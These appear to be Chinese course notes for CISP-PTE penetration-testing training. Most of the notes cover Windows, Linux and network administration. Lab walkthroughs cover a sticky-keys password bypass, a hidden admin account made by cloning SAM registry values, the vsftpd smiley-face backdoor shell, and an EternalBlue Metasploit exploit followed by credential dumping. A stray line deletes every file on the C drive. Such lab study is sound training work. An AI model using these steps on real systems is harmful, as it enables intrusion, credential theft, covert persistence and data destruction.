---

title: CISP-PTE
date: 2025-08-17 11:12:01
categories: 安全
top: 95
tags: cisp
---


# 培训

## 第一天 开班准备

### 学习寄语

```
# 班主任：大麦老师；助教老师：陈老师；培训对接老师：魏老师
# 王老师
学习：勤学多练，要理解不要背，有的放矢，有问题尽量当天解决，
要求1：（C）当前老师上课的实操要全部跟着操作完；（B）课后要熟练上课的实操内容；（A）做到举一反三
要求2：当天作业尽量当天交，考勤要注意
# 张老师（第一阶段教学）
课程：系统（Windows&Linux），网络，开发
# 肖老师（第二阶段教学）
课程：
# 叶老师（第三阶段教学）
课程：安全产品、安全服务，等保测评，安全加固，应急响应流程，防火墙，WAF，态势感知，堡垒机，企业如何使用安全产品保护IT资产，
# 上课制度
课程时长：学习四个月（3-4阶段考核）
上课时间：周一到周五，上午9:00-12:00，下午14:00-18:00，晚上18:00-22:00（自习时间）
# 韩老师-就业老师
岗位，未来规划
# 小白老师-学习方法
雷锋精神：无私奉献（开源），坚持，有底线
多向老师请教，
# 陈老师-助教老师
看完要多练习，根据理解去学习，可以加上自己的理解去做
# 大麦班主任-学习方法
多学多问，
```

###  资料下载 

```
镜像：
工具：

```

### 环境准备

Windows非家庭版安装&激活

VMware安装&配置

VPN工具安装&配置

FTP工具安装&配置

## 第二天 桌面虚拟环境

### Windows7

```bash
# VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa
Windows7 企业版
# 安装VM Tools工具的补丁
windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu
# 禁用 Windows update
services.msc
启动类型：禁用；恢复：无操作
# 关闭 配置自动更新
gpedit.msc
管理模版 > Windows组件 > Windows Uupdate >> 配置自动更新 （已禁用）
# 关闭防火墙
控制面板\系统和安全\Windows 防火墙\自定义设置
# 压缩出一个D盘30G左右
# 克隆多一台WIn7虚拟机，并修改主机名mz-PC2
```

### WinServer2019

```bash
# 桌面体验版，30G系统盘，aA1234
D潘
# 桌面优化
图标
# VMTools
安装 VMTools
# 关闭防火墙
控制面板\系统和安全\Windows 防火墙\自定义设置
# 关闭更新
gpedit.msc
管理模版 > Windows组件 > Windows Uupdate >> 配置自动更新 （已禁用）
# 无须按 Ctrl + Alt + Del交互式登录
gpedit.msc > Windows设置 > 安全设置 > 本地策略 > 安全选项 > 交互式登陆：无须按Ctrl + Alt + Del （已启用）
# 快照

# 克隆&修改主机名
```

###  VM网络模式

```
桥接
NAT
仅主机模式
```


### Dos命令

```bash
### help = command /?

# 修改字体颜色
color 0a

## dir
# 查看当前目录文件
dir
# 只显示名字
dir /w
# 显示当前目录和子目录的所以文件
dir /s
# 显示当前目录和子目录的所以文件 / 翻页
dis /s/p
# 查看隐藏文件
dir /a
# 模糊查询, ?代表一个单词
dir de?ktop
# 模糊查询2，*代表多个单词
dir d*
# 模糊查询3，空格需要要""包裹
dir "desk top"

## cd
# 进入目录, cd [.|..|path]
cd path
# 返回盘符目录，即根目录
cd /
# 直接跨盘符调整指定目录            --todo     在D盘如何直接跨盘调整到C指定目录--
cd /d [盘符]

## md 创建目录
# 创建单层目录
md test
# 创建多层目录
md a/b/c

## cd> 创建文件
# 创建aa.txt文件
cd> aa.txt
# 在a路径下创建aa.txt文件
cd> a\aa.txt

## echo 编写内容
# 往aa.txt文件覆盖写入内容whoami
echo whoami > aa.txt
# 往aa.txt文件追加写入内容whoami
echo whoami >> aa.txt
# 往a目录下的aa.txt文件覆盖写入内容whoami
echo whoami > a\aa.txt

## type 查看文件内容
# 查看aa.txt文件内容
type aa.txt

## copy 复制文件
# 将aa.txt文件拷贝到test目录中
copy aa.txt test
# 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件
copy test\aa.txt bb.txt

## ren 修改文件名称
# 将 bb.txt 修改为 cc.txt
ren bb.txt cc.txt
# 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]
ren test\aa.txt bb.txt

## rd 删除目录
# 删除 test目录[需要确认]
rd /s test
# 确定删除test目录
rd /s/q test

## del 删除文件
# 删除 aa.txt 文件
del aa.txt

### 其他
## cls 清屏
## ver 查看当前dos版本
## chkdsk 检查当前磁盘，chkdsk d: 检查D盘
## time 显示时间
## date 显示日期
## certmgr 证书管理窗口
## mstsc 打开远程窗口
## explorer 文件管理器
## calc 计时器工具
## cleanmgr 磁盘清理工具
## gpedit 本地组策略编辑器
## lusrmgr 本地用户和组
## notepad 打开记事本
## regedit 注册表
## sfc 检查文件， sfc /SCANNOW 
## taskmgr 任务管理器
## write 写字板
## help 查看有什么命令

## ipconfig 查看IP地址
ipconfig
ipconfig /all

## nslookup 查看DNS解析
nslookup baidu.com

## ping 默认ping 4次
ping baidu.com -t # 一直ping
ping baidu.com -n 10 # ping 10 次
ping baidu.com -l 1464 # 指定ping包大小为10字节 [有些网站现在ping包大小]
```

### [cisp-practise01](https://hjxstart.github.io/2025/08/21/cisp-practice01/)



## 第三天 Windows


```
Windowe系统格式：CDFS/UDF/FAT12/FAT16/FAT32/NTFS
NTFS (New Technology File System 新技术文件系统)
```

### 权限

```
默认继承权限；可以通过禁用继承，修改权限和主体；
aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；
cc/dd：如果dd禁用了继承，并修改权限；cc没有禁用继承，dd的权限保持不变；
```

### 用户 


```bash
# Win7密码保存地址：C:\Windows\System32\config\SAM；hash加密了
0、账号的编号
Administrator	500
Guest	501

1、查看用户
whoami /user # 查看当前用户
vmic useraccount get name,sid # 查看所以账号的名称和sid
net user  # 查看所有用户
net user admin # 查看admin用户信息

2、启用或禁用指定用户
net user admin /active:yes # 启用admin用户
net user admin /active:no #  禁用admin用户

3、命令创建用户
net user mz aa123456 /add  # 创建用户mz 密码为aa123456

4、命令重置用户密码
net user mz "" # 将mz用户密码重置为空

5、修改用户密码
net user mz 123456 # 将mz用户的密码修改为123456

6、命令删除用户
net user mz /del # 删除mz用户
```

### 组

```bash
# 组：Guest、Users
1、查看组
net localgroup # 查看本地用户组
2、命令创建组
net localgroup group1 /add # 创建group1组
3、命令删除组
net localgroup group1 /del # 删除group1组
4、命令添加用户到指定组
net localgroup group1 mz /add # 将用户mz加入group1组
5、把指定用户踢出组
net localgroup group1 mz /del # 将用户mz移出group1组
```

### 5次shift漏洞

```bash
# 唤醒程序路径：C:\Windows\System32\sethc
# 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件>打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username ""，设置无密码即可登录。

```

![sethc](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114649243.png)

![5次shift漏洞](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png)

### 安全策略

```
gpedit.msc > Windows设置 > 账号策略 > 密码策略 （密码长度，复杂性，默认（密码最长使用时间42天，最短0天），强制密码历史次数）
gpedit.msc > Windows设置 > 账号策略 > 账号锁定策略 （锁定时间，锁定阈值：3次无效登录，重置锁定计数器）
# 本地日志 （使用事件查看器，eventvwr.msc）
gpedit.msc > Windows设置 > 本地策略 （登录记录，系统时间等）
```

### Windows隐藏账号

```bash
net user test$ aa /add # 创建一个test$用户
net localgroup administrators test$ /add # 添加到administrators 组中
net user administrator /active:yes # 激活administrator账号
# 在本地用户和组中删除test$
regedit # 打开注册表
1、打开HKEY_LOCAL_MACHINE/SAM/SAM，右键“权限”，将administrators组更新完成控制权限，刷新注册表（查看，刷新）；
2、继续打开HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Users/Names
3、导出administrator的uuid注册表到桌面，Users/000001F4命名为admini_uuid
4、导出test$的uuid注册表到桌面，Users/000003E9命名为test_uuid
5、导出test$的name注册表到桌面，Users/Names/test$命名为test
6、编辑admini_uuid，拷贝F值到test_uuid的导出注册表中
7、命令删除test$用户：net user test$ /del，刷新检查注册表和本地用户中都没有test$用户了
8、导入test$注册表：先右键test的注册表选择合并，在右键test_uuid的注册表选择合并，刷新检查注册表有test的账号信息了
9、设置“不显示登录用户名登录”：gpedit.msc > Windows设置 > 安全设置 > 本地策略 > 安全选项 > "交互式登录：不显示最后的用户名"

```

### [cisp-practise02](https://hjxstart.github.io/2025/08/22/cisp-practice02/)

### [cisp-practise03](https://hjxstart.github.io/2025/08/23/cisp-practice03/)



##  第四天 Linux

### Centos7 安装



### Centos7网络配置

```bash
```



### Centos7 更换Yum源

```bash
# 更换阿里源
curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
# 清理yum缓存
yum clean all
# 重新生成缓存
yum makecache
```



## 文件操作





### 配置Centos7

```bash
# 清屏
clear
# 设置字体
echo 'setfont LatGrkCyr-12x22' >> /etc/bashrc
# 修改源
curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
yum clean all
yum makecache
# 安装工具
yum install wget -y # wget下载
yum install -y net-tools  # ifconfig
yum install -y bind-utils # nslookup
yum install -y vim-enhanced # vim
yum install -y tree # tree --help | more 翻页
# 防火墙命令
systemctl stop firewalld # 查看防火墙状态
systemctl disable firewalld # 禁止开机自启动
systemctl status firewalld # 查看防火墙状态
# 关闭selinux
cp /etc/selinux/config /etc/selinux/config.bak # 备份selinux备份
vim /etc/selinux/config # 将 enforcing 修改为 disabled 
getenforce # 检查 selinux是否是 disabled 状态
# tree命令
tree / -L 1
# file
file 命令可以判断文件类型
# ls命令
ls -i # index 索引
ls -alh

```

### 目录结构

```
bin # 二进制
boot # 启动，内核
dev # 设备
etc # 配置文件
home # 其他用户家目录
lib # 系统库 链接文件
mnt # 挂载
opt # 大的安装
root # root用户家目录
var # 网页
tmp # 临时文件
sys # 文件系统
srv #
```

### Linux文件类型--file

```
text 文件
shell script # shell 脚本 
executable # 可执行
data # 数据
directory # 目录
empty # 空
```

```bash
# 文件
touch aa.txt # 创建文件
echo whoami > aa.txt # 查看文件
file aa.txt # text

# 目录
mkdir test # 创建test目录
mkdir -p a/b/c # 创建多层级目录
rm -r test # 删除test目录
rm -rf a # 删除a目录，不用回复yes
mv a test # 将a目录移动到test下
mv test/a /root/b # 将test目录下的a，移动到/root下，并改名称为b

```

```
Ctrl + D # 输入结束
Ctrl + S # 暂停屏幕输出
Ctrl + U # 在提示符下，将整行命令删除
Ctrl + Z # 暂停当前任务
```



### 文件压缩和备份

```bash
## bzip2 命令：用于创建和管理（包括解压缩）".bz2"格式的压缩包
# bzip2 [选项] [要压缩的文件]
# .bz2 文件的压缩程序，并删除原始的文件
# 压缩
bzip2 aa.txt # 不保留原文件，生成aa.txt.bz2 压缩文件
bzip2 -k bb.txt # 保留原文件，生成bb.txt.bz2 压缩文件
# 解压
bzip2 -d aa.txt.bz2 # 解压文件，不保留压缩包
bzip2 -tv bb.txt.bz2 # 测试完整性，没有返回就没有问题，可选：v是可视化，f是强制替换现有的文件

## gzip
# 压缩
gzip aa.txt bb.txt # 分别压缩aa.txt.gz, bb.txt.gz，原文件不保留
gzip -l bb.txt.gz # 列出压缩包内容
gzip -c cc.txt # 标准输出（取巧）
gzip -r test # 递归，st目录下的文件分别压缩，可以使用drv，递归解压
# 解压
gzip -d bb.txt.gz # 解压缩文件，可选：f强制解压，v是可视化

## tar 打包（备份作用），f 文件是必备参数(该参数要放在最后)，(可以打包目录)
# 打包
tar -cf txt.tar *.txt # c是创建，txt.tar打包后的文件名，*.txt是要打包的文件
tar -tf txt.tar # t是查看压缩包里面的内容
# 解包
tar -xf txt.tar # 保留压缩包，解压到当前路径
# 压缩(z=gz, j=bz2)
tar -czf txt.tar.gz *.txt
tar -cjf txt.tar.bz2 *.txt
# 解压
tar -xzf txt.tar.gz
tar -xjf txt.tar.bz2 
```



### 其他命令

```bash
# which [] 命令 ： 查看命令的环境变量

# uname 显示 linux 体系结构和内核版本
uname # linux
uname -a # 查看所有信息
uname -m # 显示电脑类型 x86_64
uname -n # 主机名称
uname -r # 发行编号，不是版本号
uname -v # 版本号
uname -s # 操作系统名称
uname -p # 处理器 x86_64
uname -i # 硬件平台 x86_64
uname -io # 操作系统名称

# service 命令，旧版本的systemctl (更强大)
service [start|stop|restatus|reload|status] service_name

# systemctl service_name [start|stop|restatus|reload|status]
systemctl show firewalld
systemctl mask firewalld # 注销（无法通过命令启动，可以需要unmask找回来启动）
# 服务状态
static : 不可以自己启动，需要enabled服务来唤醒
mask : 注销，无法启动，可以通过systemctl unmask 恢复原来的状态
active (exited) : 仅执行一次就正常结束的服务
active (waiting) : 正在执行当中，不过还再等待其他的时间才能继续处理。例如打印机相关服务的状态

# cut 命令，剪
# 文件aa.txt文件如下, 分隔符可以是空格，逗号等
1	2	3
4	5	6
# cut -d '	' -f 1 aa.txt
1
4
# cut -d '	' -f 1-2 aa.txt
1	2
4	5
cut -d : -f 1,3 /etc/passwd # 只显示第1,3列

# 标准输入，输入重定向
echo -e "hello word \nhello kylin" > aa
wc -l < aa.txt > bb.txt
cat bb.tt # 2


# 多命令执行方式。可以；&& || 之间混合使用
command1;command2;command3 # 顺序执行，命令错误也会执行后面
command1&&command2&&command3 # 顺序执行，前面有错误后面不会执行
command1 || command2 || command3 # 命令1错执行命令2，命令2错执行命令3，命令1正确后面不执行
command1 | command2 | command3 #  管道符作用，只显示最后一个命令结果


# 痕迹命令
w # tty实时登录信息 , tty命令查看当前tty编号，Logname查看原始登录的用户（切换用户的情况）
who # 和w差不多，更简洁
last # 最近登录信息，显示远程登录ip
lastlog # 最后登录时间
lastb # 查看最近登录失败的信息（密码错误，或者账号错误）
```

### VIM 编辑工具

```bash
命令模式:
dd 剪切      dd + p  剪切后粘贴
yy 复制	  yy + 3p 复制后粘贴3行
u  撤销
ctl+r 恢复撤销

末行模式:
wq 保存
wq! 强制保存
q 退出
q! 强制退出
/字符串  查找改字符串
/^字符	查找以改字符为开头的
/字符$	查找以改字符为结尾的
set nu 显示行号
set nonu 取消行号
```



### 文件权限&用户

```bash
目录：755
文件：644
chmod 755 dir
chmod 655 file
chown user:group test
# 特殊权限
sudo 借用root权限
SUID: 借用User的权限，只在文件
SGID: 借用group的权限，

id username # 查看uid
# 创建用户
useradd mz
passwd aa
su mz
su
userdel -rf mz # 删除用户和文件

groupadd group_1
groupdel -f group_1
# 添加到用户到组，或者删除
gpasswd -a user group
gpsswd -d user group

# /etc/sudoers 添加用户才可以sudo提权
root ALL=(ALL) ALL
# /etc/sudoers.d/下添加也可以
echo "user ALL=(ALL) ALL" > user_sudoers


# 实例
echo 'while true ; do echo -e "\a" ; sleep 1 ; done'  >aa 
将脚本写入 aa 文件
./aa
chmod 744 aa ======= 修改成可执行文件
./aa ======= 执行 aa文件，语法为 ./[文件名]

```

### top命令

```bash
 # top 命令的交互选项：
 P按键  #根据CPU使用率从大到小排序
 M按键  #根据内存使用率从大到小排序
 N按键  #根据PIN从大到小排序
 T按键  #根据进程使用CPU累计运算的时间排序
 q按键  #退出top 
 
 ps aux  # 显示用户，tty，命令
 ps -ef # pid
 top # 动态查看，3s查看一次
```









### [cisp-practise04](https://hjxstart.github.io/2025/08/26/cisp-practice04/)



## 第五天 Kali 网络&rpm包管理工具

### 安装和配置Kali

```bash
wget -qO- https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://archive.kali.org/kali kali-rolling main non-free contrib" | sudo tee /etc/apt/sources.list
```



### 网络配置

```bash
# ifconfig
ifconfig -s # 查询网卡网络通信情况
ifconfig ens33 down # 关闭网卡，网卡不在，IP也不见了
ifconfig ens33 up # 开启网卡
ifdown ens33 # 关闭网卡，网卡还在，IP不见了
ifup ens33 # 启动网卡

# ip
ip addr # 查看IP地址
ip addr add 192.168.16.101/24 dev ens33 # 临时添加IP地址，用于测试，重启就没有了
ip link # 查看当前设备情况
ip link set ens33 down # 关闭网卡，网卡不在，
ip link set ens33 up # 开启网卡
ip link set ens33 name ens32 # 关闭网卡后，可以修改网卡名称，之后再启动
ip route show # 查看路由信息

# route
route # 显示路由 (default)
route -n # -n是以数字的方式显示 (0.0.0.0)

# netstat 查看网络连接
netstat -anpt # 显示当前主机所有互动的,TCP协议
netstat -anpu # 显示 UDP协议
netstat -lanpt # 监听

# ss 查看网络连接2，高并发的场景
ss -anpt # 和netstat差不多

# nslookup # 
nslookup www.baidu.com # 返回域名对应的IP地址

# ping
ping -c 5 www.baidu.comn # 指定ping 次数
ping -s 1000 www.baidu.com # 指定包大小

# tracert # 跟踪
yum install -y traceroute
traceroute www.wangdun.cn

# 网卡配置目录
/etc/sysconfig/network-scripts/
cp ifcfg-ens33 ifcfg-ens33.bak # 备份网卡
# vim ifcfg-ens33
TYPE="Ethernet" # 以太网
PROXY_METHOD="none" # 代理方法：关闭
BROWSER_ONLY="no" # 仅仅是浏览器
BOOTPROTO="dhcp" # 网卡协议
DEFROUTE="yes" # 默认路由
IPV4_FAILURE_FATAL="no" # 
IPV6INIT="yes"
IPV6_AUTOCONF="yes"
IPV6_DEFROUTE="yes"
IPV6_FAILURE_FATAL="no"
IPV6_ADDR_GEN_MODE="stable-privacy"
NAME="ens33" # 网卡名称
UUID="5b505e8a-35f2-4920-8241-edd9f3070780" # 唯一标识码
DEVICE="ens33" # 设备名称
ONBOOT="yes" # 是否激活
# 静态新加（DNS最多3个）
IPADDR="192.168.16.101"
NETMASK="255.255.255.0"
GATEWAY="192.168.16.2"
DNS1="223.5.5.5" # 阿里
DNS2="8.8.8.8" # 谷歌
DNS3="192.168.16.2"

# cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 223.5.5.5
nameserver 8.8.8.8
nameserver 192.168.16.2

# df
df -h # 查看系统空间
free -h # 内存空闲
cat /proc/cpuinfo # 查看CPU信息


# rpm
# http://rpmfind.net/
rpm -aq # 查询系统已安装的包
rpm -ivh # i:安装；v：可视化；h:进度
rpm -ql # 查看软件是否安装
-i # 安装
-e # 卸载

# yum
yum repolist # 查看镜像源
yum search vsftpd # 查看vsftpd软件包
yum install vsftpd # 安装vsftpd软件
yum remove vsftpd # 卸载vsftpd软件
yum autoremove # 卸载残留
yum clear all



## vsftpd
# http://rpmfind.net/
wget https://rpmfind.net/linux/mageia/distrib/8/x86_64/media/core/release/vsftpd-3.0.3-11.mga8.x86_64.rpm
# /etc/vsftpd/vsftpd.conf
anonymous_enable=NO
chroot_local_user=YES
chroot_list_enable=YES
chroot_list_file=/etc/vsftpd/chroot_list
listen=YES
listen_ipv6=NO
# 
useradd ftpuser
passwd ftpuser
vim  /etc/vsftpd/user_list # 添加ftpuser
# systemctl restart vsftpd
netstat -anpt  # 查看21端口

# 客户端
yum install ftp
sftp ftpuser@192.168.16.101
get filename # 下载
put filename # 上传
```

### 笑脸漏洞，2.3及以下版本

```bash
# 探活
nmap 192.168.16.0/24 # 可以查看到ftp
nmap -sV 192.168.16.ip # 查看服务版本

# nc 瑞士小军刀
nc 192.168.16.ip 21 # ftp21端口,用户和密码随便输入, :)是关键
	user aa:) 
	pass aaaa
	
# 同时开其他终端
sudo nmap -sS -p 6200 192.168.16.ip # 6200端口
nc 192.168.16.ip 6200 #已经进去了
	ls
	python -c 'import pty;pty.spawn("/bin/bash")'


<img src="http://img.k2r2.com/uploads/002/20230625/1618252013.jpg">

```





---

# 其他


### Win7

```bash
# 删除C盘的全部文件
del *.* /s/q
```

### Kali
```bash
# 设置中文
sudo dpkg-reconfigure locales

# 修改root密码
sudo -i
password root

## root用户视图下，更换kali源仓库为国内
cd /etc/apt
cp sources.list sources.list.bak
# 阿里源
deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
# apt更新
apt update # 没有公钥解决方法：sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED65462EC8D5E4C5

## 实用工具
# 检测主机是否存在
fping -asg 192.168.112.0/24 -C 1

## nmap  网络探测和安全审核
# nmap 192.168.112.128
135/tcp   open  msrpc # RPC远程调用
139/tcp   open  netbios-ssn # 文件共享
445/tcp   open  microsoft-ds # 永恒之蓝
3389/tcp  open  ms-wbt-server # 远程桌面端口
5357/tcp  open  wsdapi # 非常高危的端口
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
# nmap -sV 192.168.112.128

# nmap -p 1-65535 192.168.112.128

# nmap -p- 192.168.112.128
```

### 永恒之蓝 MS17-010

```bash
sudo nmap -sS -p 445 192.168.112.0/24 > p_445

cat p_445 | grep -E "Nmap|open"

# 
msfconsole
  search ms17_010
  use auxiliary/scanner/smb/smb_ms17_010
  use exploit/windows/smb/ms17_010_eternalblue\
    set rhost 192.168.112.128 # 设置靶机
    set lhost 192.168.112.130 # 设置本机IP
    set payload windows/x64/meterpreter/reverse_tcp
    run # 开始攻击

## 攻击成功后的操作
screenshot # 截图
screenshare # 实时监控屏幕
# 查看密码
hashdump
load kiwi
ps -S "csrss"
migrate 344
creds_all
shell # 登陆到win7
chcp 65001 # 消除乱码
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 远程
netstat -an # 查看端口
sudo rdesktop 192.168.112.128 # 发起远程
```

### SQL注入--CVE-2022-32991漏洞复现

```bash

```